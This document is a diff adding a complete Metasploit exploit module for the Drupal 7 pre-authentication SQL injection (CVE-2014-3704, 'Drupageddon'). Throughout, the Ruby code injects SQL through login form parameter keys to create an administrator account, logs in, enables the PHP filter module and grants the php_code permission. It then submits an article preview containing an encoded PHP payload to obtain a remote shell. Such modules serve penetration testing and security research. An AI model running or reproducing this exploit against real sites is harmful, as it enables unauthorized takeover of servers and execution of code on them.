@@ -1,0 +1,357 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'Drupal HTTP Parameter Key/Value SQL Injection',
+      'Description'    => %q{
+        This module exploits the Drupal HTTP Parameter Key/Value SQL Injection
+        (aka Drupageddon) in order to achieve a remote shell on the vulnerable
+        instance. This module was tested against Drupal 7.0 and 7.31 (was fixed
+        in 7.32).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'SektionEins',          # discovery
+          'Christian Mehlmauer',  # msf module
+          'Brandon Perry'         # msf module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2014-3704'],
+          ['URL', 'https://www.drupal.org/SA-CORE-2014-005'],
+          ['URL', 'http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html']
+        ],
+      'Privileged'     => false,
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [['Drupal 7.0 - 7.31',{}]],
+      'DisclosureDate' => 'Oct 15 2014',
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+    [
+      OptString.new('TARGETURI', [ true, "The target URI of the Drupal installation", '/'])
+    ], self.class)
+
+    register_advanced_options(
+    [
+      OptString.new('ADMIN_ROLE', [ true, "The administrator role", 'administrator']),
+      OptInt.new('ITER', [ true, "Hash iterations (2^ITER)", 10])
+    ], self.class)
+  end
+
+  def uri_path
+    normalize_uri(target_uri.path)
+  end
+
+  def admin_role
+    datastore['ADMIN_ROLE']
+  end
+
+  def iter
+    datastore['ITER']
+  end
+
+  def itoa64
+    './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+  end
+
+  # PHPs PHPASS base64 method
+  def phpass_encode64(input, count)
+    out = ''
+    cur = 0
+    while cur < count
+      value = input[cur].ord
+      cur += 1
+      out << itoa64[value & 0x3f]
+      if cur < count
+        value |= input[cur].ord << 8
+      end
+      out << itoa64[(value >> 6) & 0x3f]
+      break if cur >= count
+      cur += 1
+
+      if cur < count
+        value |= input[cur].ord << 16
+      end
+      out << itoa64[(value >> 12) & 0x3f]
+      break if cur >= count
+      cur += 1
+      out << itoa64[(value >> 18) & 0x3f]
+    end
+    out
+  end
+
+  def generate_password_hash(pass)
+    # Syntax for MD5:
+    # $P$ = MD5
+    # one char representing the hash iterations (min 7)
+    # 8 chars salt
+    # MD5_raw(salt.pass) + iterations
+    # MD5 phpass base64 encoded (!= encode_base64) and trimmed to 22 chars for md5
+    iter_char = itoa64[iter]
+    salt = Rex::Text.rand_text_alpha(8)
+    md5 = Rex::Text.md5_raw("#{salt}#{pass}")
+    # convert iter from log2 to integer
+    iter_count = 2**iter
+    1.upto(iter_count) {
+      md5 = Rex::Text.md5_raw("#{md5}#{pass}")
+    }
+    md5_base64 = phpass_encode64(md5, md5.length)
+    md5_stripped = md5_base64[0...22]
+    pass = "$P\\$" + iter_char + salt + md5_stripped
+    vprint_debug("#{peer} - password hash: #{pass}")
+
+    return pass
+  end
+
+  def sql_insert_user(user, pass)
+    "insert into users (uid, name, pass, mail, status) select max(uid)+1, '#{user}', '#{generate_password_hash(pass)}', '#{Rex::Text.rand_text_alpha_lower(5)}@#{Rex::Text.rand_text_alpha_lower(5)}.#{Rex::Text.rand_text_alpha_lower(3)}', 1 from users"
+  end
+
+  def sql_make_user_admin(user)
+    "insert into users_roles (uid, rid) VALUES ((select uid from users where name='#{user}'), (select rid from role where name = '#{admin_role}'))"
+  end
+
+  def extract_form_ids(content)
+    form_build_id = $1 if content =~ /name="form_build_id" value="(.+)" \/>/
+    form_token = $1 if content =~ /name="form_token" value="(.+)" \/>/
+
+    vprint_debug("#{peer} - form_build_id: #{form_build_id}")
+    vprint_debug("#{peer} - form_token: #{form_token}")
+
+    return form_build_id, form_token
+  end
+
+  def exploit
+
+    # TODO: Check if option admin_role exists via admin/people/permissions/roles
+
+    # call login page to extract tokens
+    print_status("#{peer} - Testing page")
+    res = send_request_cgi({
+      'uri' => uri_path,
+      'vars_get' => {
+        'q' => 'user/login'
+      }
+    })
+
+    unless res and res.body
+      fail_with(Failure::Unknown, "No response or response body, bailing.")
+    end
+
+    form_build_id, form_token = extract_form_ids(res.body)
+
+    user = Rex::Text.rand_text_alpha(10)
+    pass = Rex::Text.rand_text_alpha(10)
+
+    post = {
+      "name[0 ;#{sql_insert_user(user, pass)}; #{sql_make_user_admin(user)}; # ]" => Rex::Text.rand_text_alpha(10),
+      'name[0]' => Rex::Text.rand_text_alpha(10),
+      'pass' => Rex::Text.rand_text_alpha(10),
+      'form_build_id' => form_build_id,
+      'form_id' => 'user_login',
+      'op' => 'Log in'
+    }
+
+    print_status("#{peer} - Creating new user #{user}:#{pass}")
+    res = send_request_cgi({
+      'uri' => uri_path,
+      'method' => 'POST',
+      'vars_post' => post,
+      'vars_get' => {
+        'q' => 'user/login'
+      }
+    })
+
+    unless res and res.body
+      fail_with(Failure::Unknown, "No response or response body, bailing.")
+    end
+
+    # login
+    print_status("#{peer} - Logging in as #{user}:#{pass}")
+    res = send_request_cgi({
+      'uri' => uri_path,
+      'method' => 'POST',
+      'vars_post' => {
+        'name' => user,
+        'pass' => pass,
+        'form_build_id' => form_build_id,
+        'form_id' => 'user_login',
+        'op' => 'Log in'
+      },
+      'vars_get' => {
+        'q' => 'user/login'
+      }
+    })
+
+    unless res and res.code == 302
+      fail_with(Failure::Unknown, "No response or response body, bailing.")
+    end
+
+    cookie = res.get_cookies
+    vprint_debug("#{peer} - cookie: #{cookie}")
+
+    # call admin interface to extract CSRF token and enabled modules
+    print_status("#{peer} - Trying to parse enabled modules")
+    res = send_request_cgi({
+      'uri' => uri_path,
+      'vars_get' => {
+        'q' => 'admin/modules'
+      },
+      'cookie' => cookie
+    })
+
+    form_build_id, form_token = extract_form_ids(res.body)
+
+    enabled_module_regex = /name="(.+)" value="1" checked="checked" class="form-checkbox"/
+    enabled_matches = res.body.to_enum(:scan, enabled_module_regex).map { Regexp.last_match }
+
+    unless enabled_matches
+      fail_with(Failure::Unknown, "No modules enabled is incorrect, bailing.")
+    end
+
+    post = {
+      'modules[Core][php][enable]' => '1',
+      'form_build_id' => form_build_id,
+      'form_token' => form_token,
+      'form_id' => 'system_modules',
+      'op' => 'Save configuration'
+    }
+
+    enabled_matches.each do |match|
+      post[match.captures[0]] = '1'
+    end
+
+    # enable PHP filter
+    print_status("#{peer} - Enabling the PHP filter module")
+    res = send_request_cgi({
+      'uri' => uri_path,
+      'method' => 'POST',
+      'vars_post' => post,
+      'vars_get' => {
+        'q' => 'admin/modules/list/confirm'
+      },
+      'cookie' => cookie
+    })
+
+    unless res and res.body
+      fail_with(Failure::Unknown, "No response or response body, bailing.")
+    end
+
+    # Response: http 302, Location: http://10.211.55.50/?q=admin/modules
+
+    print_status("#{peer} - Setting permissions for PHP filter module")
+
+    # allow admin to use php_code
+    res = send_request_cgi({
+      'uri' => uri_path,
+      'vars_get' => {
+        'q' => 'admin/people/permissions'
+      },
+      'cookie' => cookie
+    })
+
+
+    unless res and res.body
+      fail_with(Failure::Unknown, "No response or response body, bailing.")
+    end
+
+    form_build_id, form_token = extract_form_ids(res.body)
+
+    perm_regex = /name="(.*)" value="(.*)" checked="checked"/
+    enabled_perms = res.body.to_enum(:scan, perm_regex).map { Regexp.last_match }
+
+    unless enabled_perms
+      fail_with(Failure::Unknown, "No enabled permissions were able to be parsed, bailing.")
+    end
+
+    # get administrator role id
+    id = $1 if res.body =~ /for="edit-([0-9]+)-administer-content-types">#{admin_role}:/
+    vprint_debug("#{peer} - admin role id: #{id}")
+
+    unless id
+      fail_with(Failure::Unknown, "Could not parse out administrator ID")
+    end
+
+    post = {
+      "#{id}[use text format php_code]" => 'use text format php_code',
+      'form_build_id' => form_build_id,
+      'form_token' => form_token,
+      'form_id' => 'user_admin_permissions',
+      'op' => 'Save permissions'
+    }
+
+    enabled_perms.each do |match|
+      post[match.captures[0]] = match.captures[1]
+    end
+
+    res = send_request_cgi({
+      'uri' => uri_path,
+      'method' => 'POST',
+      'vars_post' => post,
+      'vars_get' => {
+        'q' => 'admin/people/permissions'
+      },
+      'cookie' => cookie
+    })
+
+    unless res and res.body
+      fail_with(Failure::Unknown, "No response or response body, bailing.")
+    end
+
+    # Add new Content page (extract csrf token)
+    print_status("#{peer} - Getting tokens from create new article page")
+    res = send_request_cgi({
+      'uri' => uri_path,
+      'vars_get' => {
+        'q' => 'node/add/article'
+      },
+      'cookie' => cookie
+    })
+
+    unless res and res.body
+      fail_with(Failure::Unknown, "No response or response body, bailing.")
+    end
+
+    form_build_id, form_token = extract_form_ids(res.body)
+
+    # Preview to trigger the payload
+    data = Rex::MIME::Message.new
+    data.add_part(Rex::Text.rand_text_alpha(10), nil, nil, 'form-data; name="title"')
+    data.add_part(form_build_id, nil, nil, 'form-data; name="form_build_id"')
+    data.add_part(form_token, nil, nil, 'form-data; name="form_token"')
+    data.add_part('article_node_form', nil, nil, 'form-data; name="form_id"')
+    data.add_part('php_code', nil, nil, 'form-data; name="body[und][0][format]"')
+    data.add_part("<?php #{payload.encoded} ?>", nil, nil, 'form-data; name="body[und][0][value]"')
+    data.add_part('Preview', nil, nil, 'form-data; name="op"')
+    data.add_part(user, nil, nil, 'form-data; name="name"')
+    data.add_part('1', nil, nil, 'form-data; name="status"')
+    data.add_part('1', nil, nil, 'form-data; name="promote"')
+    post_data = data.to_s
+
+    print_status("#{peer} - Calling preview page. Exploit should trigger...")
+    send_request_cgi(
+      'method'   => 'POST',
+      'uri'      => uri_path,
+      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
+      'data'     => post_data,
+      'vars_get' => {
+        'q' => 'node/add/article'
+      },
+      'cookie' => cookie
+    )
+  end
+end
